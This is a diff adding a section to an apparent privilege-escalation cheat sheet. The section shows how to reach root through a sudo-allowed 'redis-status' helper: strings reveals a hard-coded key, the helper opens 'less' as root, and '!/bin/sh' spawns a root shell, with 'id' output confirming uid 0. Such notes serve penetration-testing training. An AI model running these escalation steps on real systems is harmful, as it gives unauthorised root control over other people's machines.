@@ -1044,6 +1044,40 @@ sudo /usr/bin/less /etc/profile
 !/bin/sh
 ```
 
+### Custom sudo helper opens less
+
+If `sudo -l` allows a custom helper as root, run basic recon on the binary before executing it blindly:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/local/bin/redis-status
+
+ls -la /usr/local/bin/redis-status
+file /usr/local/bin/redis-status
+strings /usr/local/bin/redis-status
+```
+
+Useful indicators from an observed helper:
+
+```text
+Authorization Key:
+ClimbingParrotKickingDonkey321
+/usr/bin/systemctl status redis
+Wrong Authorization Key!
+Incident has been reported!
+```
+
+If the helper runs `systemctl status`, it may open the output in `less` as root. Run the exact sudo-allowed path, enter the recovered authorization key, then escape from the pager:
+
+```bash
+sudo /usr/local/bin/redis-status
+ClimbingParrotKickingDonkey321
+!/bin/sh
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ### FTP
 
 ```
